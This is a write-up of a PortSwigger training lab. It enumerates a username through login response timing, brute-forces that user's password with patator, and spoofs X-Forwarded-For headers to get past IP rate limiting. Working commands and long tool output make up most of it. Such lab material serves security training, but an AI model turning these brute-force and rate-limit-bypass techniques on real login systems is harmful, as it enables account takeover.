# [Lab 3: Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)

## Description

This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

-   Your credentials: `wiener:peter`
-   [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
-   [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Solution

Browse to the target login form and intercept and forward a login request using BurpSuite to determine its structure.

```http
POST /login HTTP/1.1
Host: ac261f281e272f2d806321f40044008a.web-security-academy.net
Cookie: session=Y5wAf0Y3GVJv3CxyUcRY4UJP2AS32cng
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: https://ac261f281e272f2d806321f40044008a.web-security-academy.net
Dnt: 1
Referer: https://ac261f281e272f2d806321f40044008a.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

username=wiener&password=peter
```

The problem has given the valid username `wiener`. By submitting different length passwords with this username, it is evident that the server takes significantly longer to process valid usernames with long passwords than it does to process invalid usernames with long passwords.

After a bit of trial and error testing, it is also evident that the application rate limits based on IP address. However, by adding an `X-Forwarded-For` header with a new IP address with every request, it is possible to bypasss the IP-based rate limiting.

Since this login form is vulnerable to username enumeration via its response times, enumerate all usernames with a fixed, long, and incorrect password and determine the outlier response time.

```bash
$ for i in {2..102}; do echo "10.6.45.$i" >> ips.txt; done
$ paste -d ':' users.txt ips.txt > users-ips.txt
$ patator http_fuzz url=https://ac261f281e272f2d806321f40044008a.web-security-academy.net/login method=POST header='X-Forwarded-For: COMBO01' body='username=COMBO00&password=blahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblah' 0=users-ips.txt --rate-limit=2

20:37:01 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-04 20:37 CDT                                                      
20:37:01 patator    INFO -                                                                                                                                                           
20:37:01 patator    INFO - code size:clen       time | candidate                          |   num | mesg                                                                             
20:37:01 patator    INFO - -----------------------------------------------------------------------------                                                                             
20:37:04 patator    INFO - 200  3190:3003      0.128 | carlos:10.5.5.5                    |     1 | HTTP/1.1 200 OK                                                                  
20:37:04 patator    INFO - 200  3190:3003      0.129 | root:10.5.5.6                      |     2 | HTTP/1.1 200 OK                                                                  
20:37:04 patator    INFO - 200  3190:3003      0.132 | admin:10.5.5.7                     |     3 | HTTP/1.1 200 OK                                                                  
20:37:04 patator    INFO - 200  3190:3003      0.133 | test:10.5.5.8                      |     4 | HTTP/1.1 200 OK                                                                  
20:37:04 patator    INFO - 200  3190:3003      0.132 | guest:10.5.5.9                     |     5 | HTTP/1.1 200 OK                                                                  
20:37:04 patator    INFO - 200  3190:3003      0.126 | info:10.5.5.10                     |     6 | HTTP/1.1 200 OK                                                                  
20:37:04 patator    INFO - 200  3190:3003      0.126 | adm:10.5.5.11                      |     7 | HTTP/1.1 200 OK                                                                  
20:37:04 patator    INFO - 200  3190:3003      0.124 | user:10.5.5.13                     |     9 | HTTP/1.1 200 OK                                                                  
20:37:04 patator    INFO - 200  3190:3003      0.127 | mysql:10.5.5.12                    |     8 | HTTP/1.1 200 OK                                                                  
20:37:04 patator    INFO - 200  3190:3003      0.127 | administrator:10.5.5.14            |    10 | HTTP/1.1 200 OK                                                                  
20:37:07 patator    INFO - 200  3190:3003      0.131 | oracle:10.5.5.15                   |    11 | HTTP/1.1 200 OK                                                                  
20:37:07 patator    INFO - 200  3190:3003      0.132 | ftp:10.5.5.16                      |    12 | HTTP/1.1 200 OK                                                                  
20:37:07 patator    INFO - 200  3190:3003      0.136 | ec2-user:10.5.5.20                 |    16 | HTTP/1.1 200 OK                                                                  
20:37:07 patator    INFO - 200  3190:3003      0.127 | pi:10.5.5.17                       |    13 | HTTP/1.1 200 OK                                                                  
20:37:07 patator    INFO - 200  3190:3003      0.131 | puppet:10.5.5.18                   |    14 | HTTP/1.1 200 OK                                                                  
20:37:07 patator    INFO - 200  3190:3003      0.126 | ansible:10.5.5.19                  |    15 | HTTP/1.1 200 OK                                                                  
20:37:07 patator    INFO - 200  3190:3003      0.127 | vagrant:10.5.5.21                  |    17 | HTTP/1.1 200 OK                                                                  
20:37:07 patator    INFO - 200  3190:3003      0.130 | azureuser:10.5.5.22                |    18 | HTTP/1.1 200 OK                                                                  
20:37:07 patator    INFO - 200  3190:3003      0.129 | academico:10.5.5.23                |    19 | HTTP/1.1 200 OK                                                                  
20:37:07 patator    INFO - 200  3190:3003      0.131 | acceso:10.5.5.24                   |    20 | HTTP/1.1 200 OK                                                                  
20:37:09 patator    INFO - 200  3190:3003      0.129 | access:10.5.5.25                   |    21 | HTTP/1.1 200 OK                                                                  
20:37:09 patator    INFO - 200  3190:3003      0.128 | accounting:10.5.5.26               |    22 | HTTP/1.1 200 OK                                                                  
20:37:09 patator    INFO - 200  3190:3003      0.131 | accounts:10.5.5.27                 |    23 | HTTP/1.1 200 OK                                                                  
20:37:09 patator    INFO - 200  3190:3003      0.131 | acid:10.5.5.28                     |    24 | HTTP/1.1 200 OK                                                                  
20:37:09 patator    INFO - 200  3190:3003      0.126 | activestat:10.5.5.29               |    25 | HTTP/1.1 200 OK                                                                  
20:37:09 patator    INFO - 200  3190:3003      0.129 | ad:10.5.5.30                       |    26 | HTTP/1.1 200 OK                                                                  
20:37:09 patator    INFO - 200  3190:3003      0.132 | adam:10.5.5.31                     |    27 | HTTP/1.1 200 OK                                                                  
20:37:09 patator    INFO - 200  3190:3003      0.126 | admin:10.5.5.33                    |    29 | HTTP/1.1 200 OK                                                                  
20:37:10 patator    INFO - 200  3190:3003      0.133 | adkit:10.5.5.32                    |    28 | HTTP/1.1 200 OK                                                                  
20:37:10 patator    INFO - 200  3190:3003      0.131 | administracion:10.5.5.34           |    30 | HTTP/1.1 200 OK                                                                  
20:37:12 patator    INFO - 200  3190:3003      0.125 | administrador:10.5.5.35            |    31 | HTTP/1.1 200 OK                                                                  
20:37:12 patator    INFO - 200  3190:3003      0.131 | administrator:10.5.5.36            |    32 | HTTP/1.1 200 OK                                                                  
20:37:12 patator    INFO - 200  3190:3003      0.131 | adserver:10.5.5.40                 |    36 | HTTP/1.1 200 OK                                                                  
20:37:12 patator    INFO - 200  3190:3003      0.129 | administrators:10.5.5.37           |    33 | HTTP/1.1 200 OK                                                                  
20:37:12 patator    INFO - 200  3190:3003      0.128 | admins:10.5.5.38                   |    34 | HTTP/1.1 200 OK                                                                  
20:37:12 patator    INFO - 200  3190:3003      0.128 | ads:10.5.5.39                      |    35 | HTTP/1.1 200 OK                                                                  
20:37:12 patator    INFO - 200  3190:3003      0.127 | adsl:10.5.5.41                     |    37 | HTTP/1.1 200 OK                                                                  
20:37:12 patator    INFO - 200  3190:3003      0.132 | ae:10.5.5.42                       |    38 | HTTP/1.1 200 OK                                                                  
20:37:12 patator    INFO - 200  3190:3003      0.128 | af:10.5.5.43                       |    39 | HTTP/1.1 200 OK                                                                  
20:37:12 patator    INFO - 200  3190:3003      0.125 | affiliate:10.5.5.44                |    40 | HTTP/1.1 200 OK                                                                  
20:37:14 patator    INFO - 200  3190:3003      0.133 | affiliates:10.5.5.45               |    41 | HTTP/1.1 200 OK                                                                  
20:37:15 patator    INFO - 200  3190:3003      0.131 | afiliados:10.5.5.46                |    42 | HTTP/1.1 200 OK                                                                  
20:37:15 patator    INFO - 200  3190:3003      0.129 | ag:10.5.5.47                       |    43 | HTTP/1.1 200 OK                                                                  
20:37:15 patator    INFO - 200  3190:3003      0.129 | agenda:10.5.5.48                   |    44 | HTTP/1.1 200 OK                                                                  
20:37:15 patator    INFO - 200  3190:3003      0.124 | agent:10.5.5.49                    |    45 | HTTP/1.1 200 OK                                                                  
20:37:15 patator    INFO - 200  3190:3003      0.128 | ai:10.5.5.50                       |    46 | HTTP/1.1 200 OK                                                                  
20:37:15 patator    INFO - 200  3190:3003      0.126 | ak:10.5.5.53                       |    49 | HTTP/1.1 200 OK                                                                  
20:37:15 patator    INFO - 200  3190:3003      0.132 | aix:10.5.5.51                      |    47 | HTTP/1.1 200 OK
20:37:15 patator    INFO - 200  3190:3003      0.126 | ajax:10.5.5.52                     |    48 | HTTP/1.1 200 OK
20:37:15 patator    INFO - 200  3190:3003      0.131 | akamai:10.5.5.54                   |    50 | HTTP/1.1 200 OK
20:37:17 patator    INFO - 200  3190:3003      0.127 | al:10.5.5.55                       |    51 | HTTP/1.1 200 OK
20:37:17 patator    INFO - 200  3190:3003      0.127 | alabama:10.5.5.56                  |    52 | HTTP/1.1 200 OK
20:37:17 patator    INFO - 200  3190:3003      0.125 | alaska:10.5.5.57                   |    53 | HTTP/1.1 200 OK
20:37:17 patator    INFO - 200  3190:3003      0.129 | albuquerque:10.5.5.58              |    54 | HTTP/1.1 200 OK
20:37:17 patator    INFO - 200  3190:3003      0.129 | alerts:10.5.5.59                   |    55 | HTTP/1.1 200 OK
20:37:17 patator    INFO - 200  3190:3003      0.125 | alpha:10.5.5.60                    |    56 | HTTP/1.1 200 OK
20:37:17 patator    INFO - 200  3190:3003      0.129 | am:10.5.5.62                       |    58 | HTTP/1.1 200 OK
20:37:17 patator    INFO - 200  3190:3003      0.127 | amarillo:10.5.5.63                 |    59 | HTTP/1.1 200 OK
20:37:17 patator    INFO - 200  3190:3003      0.130 | americas:10.5.5.64                 |    60 | HTTP/1.1 200 OK
20:37:18 patator    INFO - 200  3190:3003      0.480 | alterwind:10.5.5.61                |    57 | HTTP/1.1 200 OK
20:37:20 patator    INFO - 200  3190:3003      0.125 | an:10.5.5.65                       |    61 | HTTP/1.1 200 OK
20:37:20 patator    INFO - 200  3190:3003      0.127 | anaheim:10.5.5.66                  |    62 | HTTP/1.1 200 OK
20:37:20 patator    INFO - 200  3190:3003      0.128 | analyzer:10.5.5.67                 |    63 | HTTP/1.1 200 OK
20:37:20 patator    INFO - 200  3190:3003      0.127 | announce:10.5.5.68                 |    64 | HTTP/1.1 200 OK
20:37:20 patator    INFO - 200  3190:3003      0.128 | announcements:10.5.5.69            |    65 | HTTP/1.1 200 OK
20:37:20 patator    INFO - 200  3190:3003      0.136 | antivirus:10.5.5.70                |    66 | HTTP/1.1 200 OK
20:37:20 patator    INFO - 200  3190:3003      0.130 | apache:10.5.5.73                   |    69 | HTTP/1.1 200 OK
20:37:20 patator    INFO - 200  3190:3003      0.128 | ap:10.5.5.72                       |    68 | HTTP/1.1 200 OK
20:37:20 patator    INFO - 200  3190:3003      0.134 | apollo:10.5.5.74                   |    70 | HTTP/1.1 200 OK
20:37:20 patator    INFO - 200  3190:3003      0.127 | ao:10.5.5.71                       |    67 | HTTP/1.1 200 OK
20:37:22 patator    INFO - 200  3190:3003      0.125 | app:10.5.5.75                      |    71 | HTTP/1.1 200 OK
20:37:22 patator    INFO - 200  3190:3003      0.131 | app01:10.5.5.76                    |    72 | HTTP/1.1 200 OK
20:37:22 patator    INFO - 200  3190:3003      0.130 | app1:10.5.5.77                     |    73 | HTTP/1.1 200 OK
20:37:22 patator    INFO - 200  3190:3003      0.131 | apple:10.5.5.78                    |    74 | HTTP/1.1 200 OK
20:37:22 patator    INFO - 200  3190:3003      0.130 | application:10.5.5.79              |    75 | HTTP/1.1 200 OK
20:37:22 patator    INFO - 200  3190:3003      0.130 | applications:10.5.5.80             |    76 | HTTP/1.1 200 OK
20:37:22 patator    INFO - 200  3190:3003      0.130 | aq:10.5.5.83                       |    79 | HTTP/1.1 200 OK
20:37:22 patator    INFO - 200  3190:3003      0.127 | appserver:10.5.5.82                |    78 | HTTP/1.1 200 OK
20:37:22 patator    INFO - 200  3190:3003      0.126 | ar:10.5.5.84                       |    80 | HTTP/1.1 200 OK
20:37:23 patator    INFO - 200  3190:3003      0.128 | apps:10.5.5.81                     |    77 | HTTP/1.1 200 OK
20:37:25 patator    INFO - 200  3190:3003      0.123 | archie:10.5.5.85                   |    81 | HTTP/1.1 200 OK
20:37:25 patator    INFO - 200  3190:3003      0.129 | arcsight:10.5.5.86                 |    82 | HTTP/1.1 200 OK
20:37:25 patator    INFO - 200  3190:3003      0.128 | argentina:10.5.5.87                |    83 | HTTP/1.1 200 OK
20:37:25 patator    INFO - 200  3190:3003      0.133 | arizona:10.5.5.88                  |    84 | HTTP/1.1 200 OK
20:37:25 patator    INFO - 200  3190:3003      0.121 | arlington:10.5.5.90                |    86 | HTTP/1.1 200 OK
20:37:25 patator    INFO - 200  3190:3003      0.119 | asia:10.5.5.93                     |    89 | HTTP/1.1 200 OK
20:37:25 patator    INFO - 200  3190:3003      0.141 | arkansas:10.5.5.89                 |    85 | HTTP/1.1 200 OK
20:37:25 patator    INFO - 200  3190:3003      0.133 | as400:10.5.5.92                    |    88 | HTTP/1.1 200 OK
20:37:25 patator    INFO - 200  3190:3003      0.131 | asterix:10.5.5.94                  |    90 | HTTP/1.1 200 OK
20:37:25 patator    INFO - 200  3190:3003      0.124 | as:10.5.5.91                       |    87 | HTTP/1.1 200 OK
20:37:27 patator    INFO - 200  3190:3003      0.126 | at:10.5.5.95                       |    91 | HTTP/1.1 200 OK
20:37:27 patator    INFO - 200  3190:3003      0.129 | athena:10.5.5.96                   |    92 | HTTP/1.1 200 OK
20:37:27 patator    INFO - 200  3190:3003      0.125 | atlanta:10.5.5.97                  |    93 | HTTP/1.1 200 OK
20:37:28 patator    INFO - 200  3190:3003      0.126 | att:10.5.5.99                      |    95 | HTTP/1.1 200 OK
20:37:28 patator    INFO - 200  3190:3003      0.127 | au:10.5.5.100                      |    96 | HTTP/1.1 200 OK
20:37:28 patator    INFO - 200  3190:3003      0.126 | auth:10.5.5.103                    |    99 | HTTP/1.1 200 OK
20:37:28 patator    INFO - 200  3190:3003      0.136 | atlas:10.5.5.98                    |    94 | HTTP/1.1 200 OK
20:37:28 patator    INFO - 200  3190:3003      0.126 | austin:10.5.5.102                  |    98 | HTTP/1.1 200 OK
20:37:28 patator    INFO - 200  3190:3003      0.135 | auto:10.5.5.104                    |   100 | HTTP/1.1 200 OK
20:37:28 patator    INFO - 200  3190:3003      0.131 | auction:10.5.5.101                 |    97 | HTTP/1.1 200 OK
20:37:30 patator    INFO - 200  3190:3003      0.128 | autodiscover:10.5.5.105            |   101 | HTTP/1.1 200 OK
20:37:30 patator    INFO - Hits/Done/Skip/Fail/Size: 101/101/0/0/101, Avg: 3 r/s, Time: 0h 0m 28s
```

`alterwind` is the outlier. Determine the password.

```bash
$ for i in {10..110}; do echo "10.10.10.$i" >> ips.txt; done
$ paste -d ':' passwords.txt ips.txt >> passwords-ips.txt
$ patator http_fuzz url=https://ac261f281e272f2d806321f40044008a.web-security-academy.net/login method=POST header='X-Forwarded-For: COMBO01' body='username=alterwind&password=COMBO00' 0=passwords-ips.txt --rate-limit=2

...
20:42:19 patator    INFO - 200  3190:3003      0.160 | charlie:10.10.10.58                |    49 | HTTP/1.1 200 OK
20:42:19 patator    INFO - 200  3190:3003      0.167 | robert:10.10.10.59                 |    50 | HTTP/1.1 200 OK
20:42:21 patator    INFO - 200  3190:3003      0.158 | thomas:10.10.10.60                 |    51 | HTTP/1.1 200 OK
20:42:21 patator    INFO - 200  3190:3003      0.158 | hockey:10.10.10.61                 |    52 | HTTP/1.1 200 OK
20:42:21 patator    INFO - 200  3190:3003      0.159 | ranger:10.10.10.62                 |    53 | HTTP/1.1 200 OK
20:42:21 patator    INFO - 200  3190:3003      0.154 | daniel:10.10.10.63                 |    54 | HTTP/1.1 200 OK
20:42:21 patator    INFO - 200  3190:3003      0.159 | starwars:10.10.10.64               |    55 | HTTP/1.1 200 OK
20:42:21 patator    INFO - 200  3190:3003      0.161 | klaster:10.10.10.65                |    56 | HTTP/1.1 200 OK
20:42:21 patator    INFO - 200  3190:3003      0.162 | 112233:10.10.10.66                 |    57 | HTTP/1.1 200 OK
20:42:21 patator    INFO - 200  3190:3003      0.151 | george:10.10.10.67                 |    58 | HTTP/1.1 200 OK
20:42:21 patator    INFO - 200  3190:3003      0.166 | computer:10.10.10.68               |    59 | HTTP/1.1 200 OK
20:42:21 patator    INFO - 200  3190:3003      0.167 | michelle:10.10.10.69               |    60 | HTTP/1.1 200 OK
20:42:24 patator    INFO - 200  3190:3003      0.162 | jessica:10.10.10.70                |    61 | HTTP/1.1 200 OK
20:42:24 patator    INFO - 200  3190:3003      0.148 | pepper:10.10.10.71                 |    62 | HTTP/1.1 200 OK
20:42:24 patator    INFO - 200  3190:3003      0.151 | 1111:10.10.10.72                   |    63 | HTTP/1.1 200 OK
20:42:24 patator    INFO - 200  3190:3003      0.160 | zxcvbn:10.10.10.73                 |    64 | HTTP/1.1 200 OK
20:42:24 patator    INFO - 200  3190:3003      0.156 | 555555:10.10.10.74                 |    65 | HTTP/1.1 200 OK
20:42:24 patator    INFO - 200  3190:3003      0.170 | 11111111:10.10.10.75               |    66 | HTTP/1.1 200 OK
20:42:24 patator    INFO - 200  3190:3003      0.169 | 131313:10.10.10.76                 |    67 | HTTP/1.1 200 OK
20:42:24 patator    INFO - 200  3190:3003      0.160 | freedom:10.10.10.77                |    68 | HTTP/1.1 200 OK
20:42:24 patator    INFO - 200  3190:3003      0.153 | pass:10.10.10.79                   |    70 | HTTP/1.1 200 OK
20:42:24 patator    INFO - 200  3190:3003      0.165 | 777777:10.10.10.78                 |    69 | HTTP/1.1 200 OK
20:42:26 patator    INFO - 200  3190:3003      0.153 | maggie:10.10.10.80                 |    71 | HTTP/1.1 200 OK
20:42:26 patator    INFO - 200  3190:3003      0.155 | 159753:10.10.10.81                 |    72 | HTTP/1.1 200 OK
20:42:26 patator    INFO - 200  3190:3003      0.149 | aaaaaa:10.10.10.82                 |    73 | HTTP/1.1 200 OK
20:42:27 patator    INFO - 200  3190:3003      0.163 | ginger:10.10.10.83                 |    74 | HTTP/1.1 200 OK
20:42:27 patator    INFO - 200  3190:3003      0.156 | princess:10.10.10.84               |    75 | HTTP/1.1 200 OK
20:42:27 patator    INFO - 200  3190:3003      0.148 | joshua:10.10.10.85                 |    76 | HTTP/1.1 200 OK
20:42:27 patator    INFO - 200  3190:3003      0.152 | cheese:10.10.10.86                 |    77 | HTTP/1.1 200 OK
20:42:27 patator    INFO - 200  3190:3003      0.157 | amanda:10.10.10.87                 |    78 | HTTP/1.1 200 OK
20:42:27 patator    INFO - 200  3190:3003      0.149 | summer:10.10.10.88                 |    79 | HTTP/1.1 200 OK
20:42:27 patator    INFO - 200  3190:3003      0.149 | love:10.10.10.89                   |    80 | HTTP/1.1 200 OK
20:42:29 patator    INFO - 200  3190:3003      0.154 | ashley:10.10.10.90                 |    81 | HTTP/1.1 200 OK
20:42:29 patator    INFO - 200  3190:3003      0.160 | nicole:10.10.10.91                 |    82 | HTTP/1.1 200 OK
20:42:29 patator    INFO - 200  3190:3003      0.165 | chelsea:10.10.10.92                |    83 | HTTP/1.1 200 OK
20:42:29 patator    INFO - 200  3190:3003      0.152 | access:10.10.10.95                 |    86 | HTTP/1.1 200 OK
20:42:29 patator    INFO - 200  3190:3003      0.159 | yankees:10.10.10.96                |    87 | HTTP/1.1 200 OK
20:42:29 patator    INFO - 200  3190:3003      0.217 | biteme:10.10.10.93                 |    84 | HTTP/1.1 200 OK
20:42:29 patator    INFO - 200  3190:3003      0.220 | matthew:10.10.10.94                |    85 | HTTP/1.1 200 OK
20:42:29 patator    INFO - 200  3190:3003      0.236 | 987654321:10.10.10.97              |    88 | HTTP/1.1 200 OK
20:42:29 patator    INFO - 200  3190:3003      0.212 | dallas:10.10.10.98                 |    89 | HTTP/1.1 200 OK
20:42:29 patator    INFO - 200  3190:3003      0.196 | austin:10.10.10.99                 |    90 | HTTP/1.1 200 OK
20:42:32 patator    INFO - 302  170:0          0.128 | thunder:10.10.10.100               |    91 | HTTP/1.1 302 Found
20:42:32 patator    INFO - 200  3190:3003      0.148 | taylor:10.10.10.101                |    92 | HTTP/1.1 200 OK
20:42:32 patator    INFO - 200  3190:3003      0.154 | matrix:10.10.10.102                |    93 | HTTP/1.1 200 OK
20:42:32 patator    INFO - 200  3190:3003      0.157 | monitor:10.10.10.105               |    96 | HTTP/1.1 200 OK
20:42:32 patator    INFO - 200  3190:3003      0.173 | monitoring:10.10.10.106            |    97 | HTTP/1.1 200 OK
20:42:32 patator    INFO - 200  3190:3003      0.157 | moon:10.10.10.108                  |    99 | HTTP/1.1 200 OK
20:42:32 patator    INFO - 200  3190:3003      0.179 | mobilemail:10.10.10.103            |    94 | HTTP/1.1 200 OK
20:42:32 patator    INFO - 200  3190:3003      0.143 | mom:10.10.10.104                   |    95 | HTTP/1.1 200 OK
20:42:32 patator    INFO - 200  3190:3003      0.159 | montana:10.10.10.107               |    98 | HTTP/1.1 200 OK
20:42:32 patator    INFO - 200  3190:3003      0.150 | moscow:10.10.10.109                |   100 | HTTP/1.1 200 OK
20:42:32 patator    INFO - Hits/Done/Skip/Fail/Size: 100/100/0/0/100, Avg: 3 r/s, Time: 0h 0m 27s
```

`thunder` is the outlier. The credentials are `alterwind:thunder`.
